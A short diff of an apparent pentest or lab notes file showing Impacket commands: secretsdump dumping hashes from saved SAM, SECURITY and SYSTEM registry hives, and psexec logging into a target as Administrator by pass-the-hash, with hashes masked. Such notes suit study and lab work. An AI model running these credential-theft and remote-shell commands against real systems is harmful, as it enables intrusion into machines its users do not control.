@@ -14,7 +14,7 @@ secretdump.py local -sam sam.save -security security.save -system system.save LO
 ```
 
 ``` shell 
-
 psexec.py Administratur@$TARGET_IP -hashes xxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxx
+# ou
 psexec.py Administratur@$TARGET_IP -hashes :xxxxxxxxxxxxxxxxxxxxxxx
 ```
